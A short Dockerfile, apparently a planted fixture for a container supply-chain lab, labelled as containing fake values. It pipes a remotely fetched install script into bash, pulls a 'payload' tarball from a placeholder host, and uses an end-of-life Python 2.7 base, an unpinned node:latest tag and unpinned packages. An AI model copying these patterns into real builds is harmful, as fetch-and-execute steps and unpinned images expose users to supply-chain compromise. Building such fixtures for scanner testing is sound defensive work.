# roqy-lab plant: container supply-chain smells (FAKE values only)
FROM python:2.7 AS build
RUN apt-get update && apt-get install -y curl \
 && curl -fsSL https://example.invalid/roqy-lab-install.sh | bash
ADD https://example.invalid/roqy-lab-payload.tgz /tmp/payload.tgz
RUN pip install requests flask

FROM node:latest
COPY --from=build /tmp/payload.tgz /tmp/payload.tgz
COPY app/ /app/
WORKDIR /app
CMD ["node", "index.js"]
